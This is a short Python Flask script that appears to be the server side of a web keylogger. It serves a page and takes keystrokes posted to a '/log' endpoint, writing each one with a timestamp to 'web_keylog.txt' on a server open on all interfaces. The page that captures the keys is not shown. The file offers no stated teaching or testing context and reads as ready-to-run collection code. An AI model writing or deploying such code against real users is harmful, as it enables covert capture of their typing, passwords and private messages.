from flask import Flask, request
from datetime import datetime

app = Flask(__name__)
log_file = "web_keylog.txt"

open(log_file, "w").close()

@app.route("/")
def index():
    return open("index.html").read()

@app.route("/log", methods=["POST"])
def log_key():
    data = request.get_json()
    key = data.get("key")
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open(log_file, "a") as f:
        f.write(f"[{timestamp}] {key}\n")
    return "", 204

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8000)
    